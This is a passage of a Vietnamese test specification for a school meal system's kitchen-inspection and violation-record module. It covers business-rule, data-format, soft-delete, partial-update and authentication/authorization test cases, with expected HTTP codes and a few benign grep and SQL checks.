**Oracle Source:** **MSG-016** nguyên văn = `"Checklist validation failed: Mandatory safety checks are missing."` + `TDS` §10 → `INSP-016`, HTTP **422** + `TDS` §13 hàng `UT-07-15` (*"vi phạm CHECK `ck_cir_evidence`"*) + BR-207 *(thuộc MF12 — xem L—CF-9, ghi rõ nguồn)*
**⚠️ Traceability:** BR-207 **không** nằm trong cột BR của UC-014 tại §1.7 (CF-9). Oracle chính của TC này là **MSG-016 + CHECK constraint §5.2**, BR-207 chỉ là nguồn gián tiếp.

**Test Steps:**
1. `POST /kitchen-inspections` với 1 mục `passed=false`, `reason=null`, `photoCount=0`.
2. Nộp lại có `reason` + ảnh.
3. Mục `passed=true` không reason.

**Expected Result (PASS):**
- (1) → `INSP-016`, HTTP **422**; message chỉ đúng mã mục (`CLI-3-8`)
- (2) → 201
- (3) → **không** chặn (chỉ mục "Không đạt" bắt buộc lý do)
- Thiếu **mục bắt buộc** (`mandatory=true` không có kết quả) → cũng `INSP-016`

**Expected Result (FAIL):** nộp được ⇒ phiên kiểm bếp có mục trượt không giải thích ⇒ không có căn cứ yêu cầu khắc phục.

**Current Status:** 🔴 Not written

---

#### MF07-TC-016 — Xoá nhóm checklist là ẨN, đã tham chiếu → 409 MSG-094

**Severity:** `HIGH`
**Feature Under Test:** `ChecklistGroupService.delete()`
**Test File:** `service/ChecklistLifecycleTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-17`
**Constraint Ref:** `TDS §17.1 C14`
**Oracle Source:** **BR-210** (*"không xóa dữ liệu lịch sử đã ghi nhận — chỉ **ẩn** hạng mục khỏi các phiên kiểm tra mới"*) + **MSG-094** (cảnh báo xác nhận) + `ADR-M12-06` + **L13/CF-15**
**⚠️ Ranh giới module:** CRUD checklist thuộc **MF12/UC-186** (CF-9). MF07 test **soft-delete** vì FK từ `checklist_item_results` nằm ở MF07 — TC này thuộc MF07, nhưng khi MF12 có TestSpec riêng thì phải khớp.

**Test Steps:**
1. `DELETE /checklist-groups/CLG-3` khi **đã** có `checklist_item_results` tham chiếu.
2. Gọi lại với `?confirmed=true`.
3. `DELETE` nhóm **chưa** được phiên nào tham chiếu.
4. Đọc phiên cũ.

**Expected Result (PASS):**
- (1) → **409** + **MSG-094**; nhóm **không** bị ẩn, chờ xác nhận
- (2) → 200; `is_active = false`; **KHÔNG** có `DELETE FROM` nào chạy
- (3) → 200; `is_active = false` (vẫn là ẩn, không xoá cứng — BR-210 áp cho mọi trường hợp)
- (4) → phiên cũ **vẫn** hiển thị đủ mục; `checklist_item_results` giữ nguyên số dòng
- Phiên **mới** tạo sau đó → **không** còn nhóm đã ẩn

**Expected Result (FAIL):**
- Xoá cứng ⇒ **phiên kiểm bếp lịch sử mất mục** ⇒ hồ sơ định kỳ (BR-101) không tái tạo được; vi phạm BR-210 trực tiếp

**Current Status:** 🔴 Not written

---

#### MF07-TC-017 — Upload ảnh ký khi chưa export PDF → VIO-211

**Severity:** `HIGH`
**Legal:** BR-211 + mẫu `00_Policies/specialreport2173_1.md`
**Feature Under Test:** `ViolationRecordService.uploadSignedRecord()` / `export()`
**Test File:** `service/ViolationRecordLifecycleTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-15`
**Constraint Ref:** `TDS §17.1 C7`
**Oracle Source:** **BR-211** (*"Xuất PDF theo mẫu → in → **ký tay 2 bên** → tải ảnh/scan"* — thứ tự bắt buộc) + `TDS` §10 → `VIO-211`, HTTP **409** + `TDS` §13 hàng `UT-07-17` + `TDS` §15.2 + **L18/CF-21**
**Kỹ thuật:** State Transition Testing (chuỗi bắt buộc) + Error Guessing (nhảy bước)

**Preconditions:** `FX-017` — biên bản `pdf_exported = false`, `signed_record_photo_url = NULL`.

**Test Steps:**
1. `uploadSignedRecord()` **trước** khi export → assert.
2. `export-pdf` → assert PDF.
3. `uploadSignedRecord()` → assert.
4. Gọi `export-pdf` **lần 2** → so sánh bytes.

**Expected Result (PASS):**
- (1) → `VIO-211`, HTTP **409**; **không** file nào được lưu
- (2) → 200; PDF **thật do server sinh (PDFBox)**, có `%PDF-` header, `pdf_exported=true`, `pdf_generated_at` set, `pdf_version` tăng
- (3) → 200; `signed_record_photo_url` + **`sha256`** được lưu (ADR-M07-04 — chống sửa bằng chứng)
- (4) → PDF lần 2 **cùng cấu trúc** (cùng số trang, cùng các trường của mẫu); **bản in đồng nhất** — đây là lý do BR-211 đòi server sinh chứ không phải browser render (L18)
- PDF chứa các trường bắt buộc của mẫu `specialreport2173_1.md`

**Expected Result (FAIL):**
- (1) qua được ⇒ có ảnh "bản đã ký" mà chưa từng có bản in ⇒ ảnh đó không thể là bản ký của biên bản này
- PDF render ở client (L18) ⇒ **2 máy in ra 2 bản khác nhau**, không dùng được làm văn bản pháp lý
- Không lưu `sha256` ⇒ không phát hiện được ảnh bị thay sau khi upload

**Current Status:** 🔴 Not written

---

#### MF07-TC-018 — Dò tái diễn 90 ngày SERVER-SIDE, bỏ qua repeatSuspect FE gửi

**Severity:** `MEDIUM`
**Feature Under Test:** `ViolationRecordRepository.findRepeatCandidates()`
**Test File:** `service/RepeatViolationDetectionTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-14`
**Constraint Ref:** `TDS §17.1 C11`
**Oracle Source:** **BR-187** (cảnh báo tái diễn trong cửa sổ 90 ngày, căn cứ theo **`caterersRepresentativeId`** sau bản sửa 26/07/2026) + **MSG-088** + **L14/CF-16**
**⚠️ Logic Issue nội dung MSG:** TDS §10 ghi rõ **MSG-088 nói *"staff name matches"*** nhưng BR-187 (26/07) đã đổi căn cứ sang `caterersRepresentativeId` ⇒ **nội dung MSG-088 đã lỗi thời**, cần Huy cập nhật `error_message.md`. TC assert **mã** `VIO-088` và **logic dò**, **không** assert chuỗi "staff name".
**Kỹ thuật:** Boundary Value Analysis (cửa sổ 89/90/91 ngày) + Equivalence Partitioning (severity)

**Preconditions:** `FX-014` `VIO-2026-008` + `FX-016` `VIO-2026-009` — cùng `caterersRepresentativeId`, cùng `MEDIUM`, cách nhau 2 ngày.

**Test Steps:**
1. Lập biên bản mới cùng đại diện, `severity=MEDIUM`, cách bản gần nhất **30 ngày** → assert.
2. `@ValueSource(ints = {89, 90, 91})` cho khoảng cách ngày.
3. `severity=LOW` trong 30 ngày → assert.
4. Gửi payload có **`repeatSuspect: false`** dù thực tế có tái diễn.
5. Khác `caterersRepresentativeId` → assert.

**Expected Result (PASS):**
- (1) → `repeatSuspect == true`, warning `VIO-088`
- (2) → `89` và `90` → true; **`91` → false** (ngoài cửa sổ)
- (3) → `LOW` **không** tính (BR-187 chỉ ≥ MEDIUM)
- (4) → backend **tự dò**, trả `repeatSuspect: true` — **bỏ qua** `false` FE gửi
- (5) → false

**Expected Result (FAIL):**
- Tin `repeatSuspect` FE gửi ⇒ **đơn vị bị lập biên bản tự quyết định** mình có tái diễn hay không (L14)
- Dò theo `staffName` ⇒ sai căn cứ sau bản sửa BR-187 26/07, và đụng L11 (field cá nhân deprecated)

**Current Status:** 🔴 Not written

---

#### MF07-TC-019 — API tạo biên bản TỪ CHỐI field cá nhân deprecated

**Severity:** `HIGH`
**Legal:** PDPD — BR-183 (26/07/2026) bỏ biên bản nhắm cá nhân
**Feature Under Test:** `ViolationRecordService.create()`
**Test File:** `service/ViolationRecordCreateTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-12`
**Constraint Ref:** `TDS §17.1 C7`
**Oracle Source:** **BR-183** (*"Mọi vi phạm do Service Caterers gây ra → **1 loại Biên bản Vi phạm duy nhất**, nhắm **đơn vị Nhà thầu** (không nhắm cá nhân): `reportedBy`, mô tả, ảnh bằng chứng, `severityLevel`, `caterersRepresentativeId`"*) + **BR-184 Deprecated 26/07/2026** + `TDS` §13 hàng `UT-07-19` + **L11/CF-7**
**Kỹ thuật:** Equivalence Partitioning (field hợp lệ / deprecated)

**Test Steps:**
1. `POST /violations` với payload có **`staffName`** → assert.
2. Payload có `staffPosition` / `disciplinaryLevel` / `type: "Nhân sự"` → assert.
3. Payload đúng BR-183 (`caterersRepresentativeId`, `unitSanctionLevel`) → assert.
4. `GET /violations/VIO-2026-007` (dữ liệu lịch sử **có** `staffName`) → assert.

**Expected Result (PASS):**
- (1)(2) → **422**; message nêu rõ field đã deprecated theo BR-183 (26/07/2026)
- (3) → **201**; message **MSG-086** = `"Violation record saved successfully."` *(nguyên văn `error_message.md`)*
- (4) → **200** và **VẪN trả** `staffName` của bản ghi cũ — **đọc được, không tạo mới được**. Đây là phân biệt then chốt: L11 nói mock ghi rõ *"KHÔNG xoá field"*.
- Thiếu mô tả hoặc ảnh → **`VIO-085`** (MSG-085) HTTP 422

**Expected Result (FAIL):**
- Chấp nhận `staffName` ⇒ tiếp tục tạo biên bản nhắm cá nhân sau khi BR-184 đã bỏ ⇒ rủi ro PDPD + sai nghiệp vụ (biên bản phải nhắm đơn vị để có hiệu lực hợp đồng)
- Xoá field khỏi response của bản ghi cũ ⇒ mất dữ liệu lịch sử, màn báo cáo gãy

**Current Status:** 🔴 Not written

---

#### MF07-TC-020 — Gate MSG-095: đóng/gửi duyệt khi chưa có ảnh ký → VIO-095

**Severity:** `CRITICAL`
**Legal:** BR-211 (*gate chặn cứng*)
**Feature Under Test:** `ViolationRecordService` — chuyển `resolution`
**Test File:** `service/ViolationSignedRecordGateTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-16`
**Constraint Ref:** `TDS §17.1 C7, C13`
**Oracle Source:** **BR-211** (*"Lưu biên bản **không bị chặn** bởi thiếu ảnh ký, nhưng **gate chặn cứng** ở bước Đóng/Gửi duyệt (MSG-095)"*) + **MSG-095** nguyên văn = `"Cannot close/submit this violation resolution: the signed 3-party record photo has not been uploaded yet. Please print, collect signatures, and upload the signed record first."` + `TDS` §10 → `VIO-095`, HTTP **409** + **L22/CF-30**
**⚠️ Logic Issue:** **L22/CF-30** — gate hiện **chỉ disable nút ở client**; gọi thẳng API là lách được.
**Kỹ thuật:** Decision Table + Error Guessing (bypass UI)

**Test Steps:** `@MethodSource`:

| # | `signed_record_photo_url` | `resolution` đích | Expected |
|---|---|---|---|
| a | `NULL` | `PENDING_APPROVAL` | **409** `VIO-095` |
| b | `NULL` | `APPROVED` | **409** `VIO-095` |
| c | `NULL` | *(chỉ lưu nháp, giữ `PENDING`)* | **200** — BR-211 nói lưu **không** bị chặn |
| d | có ảnh | `PENDING_APPROVAL` | **200**, `locked = true` |
| e | có ảnh | `APPROVED` | **200** |
| f | có ảnh, đã `locked` | sửa cột nội dung (`description`) | **409** — append-only (ADR-M07-05) |

**Expected Result (PASS):**
- Đúng 6 hàng; ở mọi ca 409, DB **không** đổi
- Ca (c) khẳng định rõ ranh giới: **lưu được, đóng/gửi duyệt thì không** — đây là chỗ dễ implement sai thành "chặn cả lưu"
- Ca (f): sau khi khoá, mọi thay đổi ghi thêm dòng `audit_logs` (BR-188), **không** update cột nội dung

**Expected Result (FAIL):**
- (a)/(b) trả 200 ⇒ **biên bản được gửi duyệt mà không có bản ký tay 2 bên** ⇒ văn bản vô hiệu về pháp lý; đúng lỗ hổng L22 đang tồn tại
- (c) bị chặn ⇒ Medical Staff không lưu được nháp, phải nhập lại từ đầu sau khi in

**Current Status:** 🔴 Not written
**Implementation Note:** gate ở **service**, không ở controller — vì luồng phê duyệt (UC-182) nằm ở MF11 và cũng phải đi qua cùng gate này (L10).

---

#### MF07-TC-021 — MSG-055/059 chỉ phát khi nhập tay ngoài dải, KHÔNG giám sát tự động

**Severity:** `MEDIUM`
**Feature Under Test:** `KitchenInspectionService` — ghi nhận nhiệt độ thủ công
**Test File:** `service/ManualTempAlertTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-39`
**Oracle Source:** **MSG-055** = `"High temperature alert in inventory storage area: [Temperature]°C."` · **MSG-059** = `"Retention refrigerator door left open or temperature fluctuation detected."` + `TDS` §10 (*"Nhân viên **nhập tay** nhiệt độ kho ngoài dải — xem CF-3"*) + **L7/CF-3** (BR-089 **Deprecated 11/07/2026** — hệ thống không quản lý IoT)
**⚠️ Traceability:** §1.7 gán MSG-055/059 cho UC-054 kèm BR-089 (đã deprecated). TC này test **cơ chế thủ công**, không phải giám sát tự động — ghi rõ để Huy xử lý.

**Test Steps:**
1. Ghi nhiệt độ kho **trong** dải → assert.
2. Ghi **ngoài** dải → assert.
3. Assert **không** có scheduler/job nào tự đọc nhiệt độ.

**Expected Result (PASS):**
- (1) → không warning
- (2) → warning MSG-055 với `[Temperature]` = giá trị đã nhập; HTTP **200** (warning, không lỗi)
- (3) → **không** tồn tại `@Scheduled` nào liên quan nhiệt độ:
  ```bash
  grep -rn "@Scheduled" src/main/java/com/sfms/mf07/ | grep -i "temp\|fridge"
  # Expected: no output
  ```
- **Không** bảng `fridge_temp_logs` (L8/CF-4) — kiểm ở `MF07-TC-INT-015`

**Expected Result (FAIL):**
- Có job tự động ⇒ implement lại cơ chế **đã deprecated** (BR-089), tốn công và tạo cảnh báo giả vì không có thiết bị IoT nào

**Current Status:** 🔴 Not written

---

#### MF07-TC-022 — medicalReview*: 4 field DUY NHẤT Medical Staff ghi được

**Severity:** `HIGH`
**Feature Under Test:** field-level authorization trên `PUT /inspections/{code}`
**Test File:** `service/MedicalReviewFieldTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-40`
**Constraint Ref:** `TDS §17.1 C10`
**Oracle Source:** `TDS` **§16 bảng field-level** — hàng *"`inspections` | `medicalReviewResult`/`medicalReviewReason`/`medicalReviewBy`/`medicalReviewAt` | **Medical Staff** — 4 field DUY NHẤT Y tế được ghi"* + **CF-10** *(4 field này **chưa có BR/UC nguồn** — oracle là TDS §5.2 + §16)*

**Test Steps:**
1. Medical Staff `PUT` chỉ 4 field `medicalReview*` → assert.
2. Medical Staff `PUT` kèm `step2` hoặc `coreTemp` → assert.
3. Caterer `PUT` field `medicalReview*` → assert.

**Expected Result (PASS):**
- (1) → **200**; 4 field được ghi
- (2) → **403**; **không** field nào được ghi (kể cả 4 field hợp lệ trong cùng request — reject cả request, không ghi một phần)
- (3) → **403**
- `Oracle Source` của TC ghi rõ: chưa có BR/UC nguồn (CF-10), **không** tự cấp mã

**Expected Result (FAIL):**
- (2) ghi một phần ⇒ Y tế sửa được kết quả bước kiểm thực của đơn vị suất ăn ⇒ phá tính độc lập giữa người thực hiện và người giám sát

**Current Status:** 🔴 Not written

---

#### MF07-TC-023 — confirmStatus chỉ Service Caterers (đơn vị bị kiểm) ghi được

**Severity:** `MEDIUM`
**Feature Under Test:** `POST /kitchen-inspections/{code}/confirm` + field-level authz
**Test File:** `service/KitchenConfirmTest.java`
**TDD Phase:** 🔴 RED · ⚠️ màn xác nhận phía Caterer **chưa code** (§9.2 #26)
**Condition Ref:** `COND-41`
**Constraint Ref:** `TDS §17.1 C10`
**Oracle Source:** `TDS` §16 bảng field-level — `confirmStatus` → **Service Caterers (đơn vị bị kiểm)** + `TDS` §5.2 (`AWAITING_CATERERS_CONFIRM` → `CONFIRMED`) + **CF-10** *(chưa có BR/UC nguồn)*

**Expected Result (PASS):**
- Caterer của **đúng** đơn vị bị kiểm → 200, `confirmStatus: AWAITING_CATERERS_CONFIRM → CONFIRMED`
- Caterer **đơn vị khác** → **403**
- Medical Staff (người lập phiên) → **403** (không tự xác nhận thay đơn vị bị kiểm)
- Chuyển trạng thái ngược (`CONFIRMED → AWAITING`) → **409**

**Expected Result (FAIL):** Medical Staff tự xác nhận ⇒ mất ý nghĩa của bước xác nhận 2 bên.

**Current Status:** 🔴 Not written

---

#### MF07-TC-024 — JSON ngày là ISO-8601 (D4 ghi đè C12)

**Severity:** `HIGH`
**Feature Under Test:** `InspectionMapper` / `ViolationMapper` (MapStruct)
**Test File:** `mapper/DateFormatContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-22`
**Constraint Ref:** **`00_Common_Conventions.md` D4** (ghi đè `TDS §17.1 C12`)
**Oracle Source:** **D4** — *"Ngày → `"2026-07-29"` (`LocalDate`); Ngày giờ → `"2026-07-29T02:15:00Z"` (`Instant`)"*; *"FE thêm `lib/format.ts` và gọi ở **tầng render** — không lưu chuỗi đã format vào state hay payload"* + **L3**
**⚠️ Logic Issue:** **L3** — TDS §17.1 **C12** và CF-22 nói `dd/MM/yyyy`. **D4 (Approved 30/07) ghi đè.** TC assert theo D4.

**Test Steps:**
1. `PUT` với `{"date": "24/07/2026"}` (dạng mock đang gửi) → assert parse OK.
2. `PUT` với `{"date": "2026-07-24"}` → assert parse OK.
3. `GET` → assert **định dạng trả về**.
4. Assert **không** còn `@JsonFormat` trong code.

**Expected Result (PASS):**
- (1)(2) → cùng ra một `LocalDate` (backend **parse khoan dung cả 2 dạng** vì D4 ghi rõ *"không sửa seed `mock-data.ts` ở đợt này"*)
- (3) → `"date": "2026-07-24"` (**ISO**); `"occurredAt": "2026-07-24T02:15:00Z"`; tương tự `signedAt`, `medicalReviewAt`, `recordPdfExportedAt`, `pdfGeneratedAt`
- (4) → không còn annotation format ngày:
  ```bash
  grep -rn "@JsonFormat" src/main/java/com/sfms/mf07/
  # Expected: no output (D4)
  ```
- DB: cột ngày là `date`/`timestamptz`, **không** `varchar`

**Expected Result (FAIL):**
- Trả `dd/MM/yyyy` ⇒ vi phạm D4 (hợp đồng đã Approved); và khi các module khác chuyển ISO thì MF07 thành ngoại lệ duy nhất
- Không parse được `dd/MM/yyyy` ⇒ FE hiện tại gãy ngay (D4 chưa yêu cầu FE đổi payload ở đợt này)
- Lưu chuỗi vào DB ⇒ lọc `dateFrom`/`dateTo` (§2b-5) sai. ⚠️ D4 cảnh báo thêm: `paginate()` của mock parse ngày bằng regex `dd/MM/yyyy` — khi seed chuyển ISO mà quên sửa, lọc sẽ **im lặng trả rỗng**.

**Current Status:** 🔴 Not written
**Implementation Note:** một converter dùng chung ở `common/` (Nam sở hữu) cho cả 13 module, không viết riêng cho MF07.

---

#### MF07-TC-025 — meal là SCREAMING_SNAKE MealType (D6 ghi đè C12)

**Severity:** `HIGH`
**Feature Under Test:** enum `common/enums/MealType` + mapper
**Test File:** `mapper/MealTypeContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-23`
**Constraint Ref:** **`00_Common_Conventions.md` D6** (ghi đè `TDS §17.1 C12`)
**Oracle Source:** **D6** — `MealType` = `BREAKFAST` / `LUNCH` / `SNACK`, *"tất cả **SCREAMING_SNAKE** trong JSON và DB. FE giữ bảng nhãn tiếng Việt ở `lib/labels.ts`"*; và **D6 chốt nhãn `SNACK` = "Bữa phụ"**, ghi rõ *"⚠️ Nhãn cũng lệch: **"Bữa phụ" ≠ "Bữa chiều"** — chốt "Bữa phụ""* + **L4/CF-8**
**⚠️ Logic Issue:** **L4** — TDS §17.1 C12 nói giữ `meal` là nhãn tiếng Việt; mock dùng `"Bữa sáng"/"Bữa trưa"/"Bữa chiều"`. **D6 ghi đè** cả giá trị **và** nhãn (`"Bữa chiều"` của mock là **sai**).

**Test Steps:**
1. `POST` với `{"meal": "Bữa trưa"}` → assert parse.
2. `POST` với `{"meal": "LUNCH"}` → assert parse.
3. `POST` với `{"meal": "Bữa chiều"}` → assert.
4. `GET` → assert giá trị trả về.
5. `POST` với `{"meal": "Bữa tối"}` → assert.

**Expected Result (PASS):**
- (1)(2) → cùng ra `MealType.LUNCH` (parse khoan dung nhãn cũ vì mock chưa đổi)
- (3) → map về **`SNACK`** kèm **warning log** `"D6: nhãn 'Bữa chiều' đã lệch — chốt 'Bữa phụ'"` (để có vết cho Minh sửa `labels.ts`)
- (4) → `"meal": "LUNCH"` (**SCREAMING_SNAKE**), **không** phải `"Bữa trưa"`
- (5) → **422** (ngoài 3 giá trị D6)
- Enum lấy từ **`common/enums/MealType`** (Nam sở hữu) — **không** khai lại trong `com.sfms.mf07`:
  ```bash
  grep -rn "enum MealType" src/main/java/com/sfms/mf07/
  # Expected: no output (D6 — module không tự khai lại)
  ```

**Expected Result (FAIL):**
- Trả `"Bữa trưa"` ⇒ vi phạm D6; MF05 dùng `LUNCH`, MF07 dùng tiếng Việt ⇒ **hai module không join được theo bữa**, phá liên kết MF05↔MF07↔MF09
- Khai enum riêng trong MF07 ⇒ hai bộ giá trị sẽ lệch lần sau

**Current Status:** 🔴 Not written

---

#### MF07-TC-026 — Nhận id client, trùng → 409 (D5)

**Severity:** `MEDIUM`
**Feature Under Test:** `InspectionSessionService.openSession()` / `ViolationRecordService.create()`
**Test File:** `service/CodePolicyTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-25`, `COND-21`
**Constraint Ref:** **`00_Common_Conventions.md` D5 + D1**
**Oracle Source:** **D5** — *"Nếu request body có `id` → dùng làm `code`, kiểm trùng → trùng thì **409**… Nếu vắng → server tự sinh theo `code_sequences` (D1)… Backend **luôn** trả `id` trong response 201"* + **D1** (khuôn mã, `INSERT ... RETURNING` chống trùng khi song song)

**Test Steps:**
1. `POST /inspections` với `{"id": "INSP-20260805-L"}` → lần 1.
2. Lặp lại cùng `id` → lần 2.
3. `POST` **không** có `id`.
4. 2 request **song song** không có `id`.

**Expected Result (PASS):**
- (1) → **201**; response có `"id": "INSP-20260805-L"`; DB `code` = giá trị đó, `id` (UUID) do JPA sinh
- (2) → **409**, mã `INSP-409` (D5); **không** tạo bản ghi thứ 2, **không** ghi đè
- (3) → **201**; `code` do server sinh; response **có** `id` (D5: *"FE đọc từ response"*)
- (4) → 2 `code` **khác nhau** (dùng `code_sequences` + `INSERT ... RETURNING`, không đọc-rồi-ghi — D1)

**Expected Result (FAIL):**
- Đổi `id` client gửi ⇒ FE điều hướng ngay sau `onSuccess` bằng id mình gửi → 404 (D5 nêu đúng rủi ro này)
- 2 request song song ra cùng `code` ⇒ trùng mã trên hồ sơ pháp lý

**Current Status:** 🔴 Not written

---

#### MF07-TC-027 — Phát suất khi kiểm thực trượt PHẢI bị phát hiện

**Severity:** `CRITICAL`
**Feature Under Test:** ràng buộc chéo MF07 ↔ MF09 (`serving-gate` + dữ liệu `student_distributions`)
**Test File:** `service/ServingConsistencyTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-09`
**Constraint Ref:** `TDS §17.1 C4`
**Oracle Source:** port nguyên luật **`PHAT_SUAT_DU_KIEM_THUC_TRUOT`** (`semantic-audit.ts` §7: phiên có `overall` khớp `/KHÔNG ĐẠT|FAIL/i` mà cùng ngày có bản ghi `status === "SERVED"` ⇒ vi phạm) + **BR-094** + `TDS` §13 hàng `UT-07-20`
**Kỹ thuật:** Constraint-based (kiểm tính nhất quán dữ liệu)

**Preconditions:** `FX-002` phiên FAILED + `FX-019` bản ghi `student_distributions` `status="SERVED"` cùng ngày (**dữ liệu vi phạm cố ý**).

**Test Steps:**
1. Chạy truy vấn kiểm nhất quán trên fixture vi phạm.
2. Chạy trên fixture hợp lệ (phiên PASSED + SERVED).
3. Thử `POST` phát suất qua đường chính (MF09 gọi `serving-gate`).

**Expected Result (PASS):**
- (1) → phát hiện **≥ 1** vi phạm, báo đúng `code` phiên và số suất:
  ```sql
  SELECT s.code, count(d.*) AS served
    FROM inspection_sessions s
    JOIN student_distributions d
      ON d.date = s.date AND d.status = 'SERVED'
   WHERE s.overall = 'FAILED'
   GROUP BY s.code;
  -- Expected trên fixture vi phạm: >= 1 row · trên DB sạch sau test: 0 row
  ```
- (2) → 0 vi phạm
- (3) → bị chặn bởi `serving-gate` (`allowed=false`, `INSPECTION_FAILED`) ⇒ **không thể tạo ra vi phạm này qua đường API chính**
- Truy vấn (1) được đưa vào **§6 Exit Criteria** — chạy trước mỗi release

**Expected Result (FAIL):**
- (1) không phát hiện ⇒ mất lớp kiểm tra cuối; `semantic-audit.ts` sẽ đỏ ở CI mà không ai biết nguyên nhân
- (3) qua được ⇒ **suất ăn trượt kiểm thực tới tay học sinh** — hậu quả nghiêm trọng nhất trong toàn hệ thống

**Current Status:** 🔴 Not written
**Implementation Note:** vi phạm này có thể phát sinh từ **dữ liệu cũ** hoặc từ MF09 tự query bảng thay vì gọi `serving-gate` (`MF07-TC-SEC-015`). Truy vấn (1) là lưới an toàn, **không** thay thế gate.

---

#### MF07-TC-028 — PUT là partial merge, KHÔNG replace (mất step*Rows)

**Severity:** `CRITICAL`
**Feature Under Test:** `InspectionSessionService.update()`
**Test File:** `service/PartialMergeTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-20`
**Constraint Ref:** `TDS §17.1 C9`
**Oracle Source:** `TDS` §17.1 **C9** — *"`PUT /{resource}/{id}` là **merge một phần (PATCH-semantics)** — hook `useUpdate` chỉ gửi tập field con, và mỗi lần ghi bước FE gửi lại **toàn bộ `formPayload`** (5 field mẫu biểu). **KHÔNG** replace toàn bộ: sẽ xoá sạch `step1Fresh`/`step2Rows`/`evidenceFiles`"* + `TDS` §9.0 + `mock-server.ts:354` (`Object.assign`)
**Kỹ thuật:** Contract Testing

**Preconditions:** phiên có đủ `step1Fresh` (3 dòng), `step1Dry` (2 dòng), `step2Rows` (2 dòng), `evidenceFiles` (2 ảnh), `staffNotes`.

**Test Steps:**
1. `PUT` body **chỉ** `{"staffNotes": "ghi chú mới"}`.
2. Đọc lại toàn bộ.
3. `PUT` body chỉ `{"step2": "PASSED"}`.
4. Đọc lại.

**Expected Result (PASS):**
- Sau (1): `staffNotes` đổi; **mọi bảng dòng giữ nguyên số dòng** (3/2/2), `evidenceFiles` vẫn 2 ảnh, `inspector`/`dish`/`meal` không null
- Sau (3): chỉ `step2` đổi; `staffNotes` của bước (1) **vẫn còn**
- `orphanRemoval` **không** kích hoạt khi body không có `step*Rows`

**Expected Result (FAIL):**
- Field không gửi bị `null` ⇒ **xoá sạch mẫu biểu kiểm thực** — hồ sơ pháp lý bị huỷ nội dung bởi một request cập nhật ghi chú. Đây là lỗi thầm lặng nguy hiểm nhất của hợp đồng §9.0.
- `evidenceFiles` bị xoá ⇒ mất ảnh bằng chứng (BR-083)

**Current Status:** 🔴 Not written
**Implementation Note:** DTO update dùng `Optional<T>`/`JsonNullable<T>` hoặc `Map<String,Object>` để phân biệt **"không gửi"** với **"gửi null"**. Record thường sẽ điền `null` và không phân biệt được.

---

### 4.2. SECURITY TEST CASES

> Layer `com.sfms.mf07.web` qua **MockMvc** + JWT giả lập (`RoleKey` kebab-case theo **D6**).
> Oracle phân quyền duy nhất: **`TDS-MF07_Backend.md` §16** (ma trận 7 role × 20 nhóm endpoint **+ bảng field-level 6 nhóm**), dẫn từ **BR-007** (RBAC), **BR-099** (row-level), **BR-186** (phân nhánh người duyệt).

---

#### MF07-TC-SEC-001 — Không JWT → 401 trên MỌI endpoint

**Severity:** `CRITICAL` · **OWASP:** `A07:2021` · **CWE:** `CWE-306 — Missing Authentication for Critical Function`
**Legal:** PDPD — ảnh bằng chứng + định danh đại diện Nhà thầu
**Feature Under Test:** filter chain × **29 endpoint** §9.2
**Test File:** `web/InspectionSecurityTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-34`
**Oracle Source:** `TDS` §4.3 (*mọi endpoint trừ health yêu cầu JWT*) + **MSG-004** = `"Session expired. Please log in again."` + `TDS` §10 → `INSP-004`, HTTP **401** + `TDS` §15.2 (`curl -i localhost:8080/api/v1/inspections`) + **D2** envelope

**Test Steps (Attack Simulation):** `@ParameterizedTest @MethodSource("allMf07Endpoints")` — 29 endpoint (method + path) từ §9.2, gọi không header `Authorization`.

**Expected Result (PASS = hệ thống an toàn):**
- **401** cho cả 29 endpoint; body theo **D2**: `$.error.code == "INSP-004"`, `$.error.message` = MSG-004 nguyên văn
- **Không** endpoint nào trả 200/403 (403 = đã qua authn, sai lớp)
- Đối chứng: cùng endpoint **có** JWT hợp lệ trả ≠ 401 (chống Red Gate bẫy #3)

**Expected Result (FAIL = lỗ hổng tồn tại):** bất kỳ endpoint trả 200 ⇒ hồ sơ kiểm thực + ảnh bằng chứng + biên bản vi phạm đọc được ẩn danh.

**Current Status:** 🔴 Not written
**Implementation Note:** `allMf07Endpoints()` là **một** danh sách hằng dùng chung với `TC-SEC-007` — thêm endpoint mới là tự động có test.

---

#### MF07-TC-SEC-002 — Parent bị chặn TOÀN BỘ endpoint MF07

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-862`
**Test File:** `web/InspectionAuthorizationMatrixTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-34`
**Oracle Source:** `TDS` §16 — cột **PARENT** là ❌ ở **cả 20 hàng** + `TDS` §13 hàng `SEC-07-02` + MSG-005 → `INSP-005`, HTTP **403**

**Test Steps:** `FX-024` role `parent` → 29 endpoint.

**Expected Result (PASS):** **403** ở toàn bộ; `$.error.code == "INSP-005"`.
**Expected Result (FAIL):** bất kỳ 200 ⇒ phụ huynh đọc được hồ sơ nội bộ về bếp và biên bản vi phạm của nhà thầu — vượt phạm vi cần biết, rủi ro PDPD và tranh chấp hợp đồng.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-003 — Teacher gọi POST /kitchen-inspections → 403

**Severity:** `HIGH` · **OWASP:** `A01:2021` · **CWE:** `CWE-863`
**Test File:** `web/InspectionSecurityTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-34`
**Oracle Source:** `TDS` §16 hàng `POST /kitchen-inspections (UC-014)` — chỉ ✅ ở **MEDICAL STAFF** + `traceability_matrix.md` §1.7 (UC-014 actor = **Medical Staff**) + `TDS` §13 hàng `SEC-07-03`

**Expected Result (PASS):**
- **403** `INSP-005`; **không** bản ghi `kitchen_inspections` nào được tạo
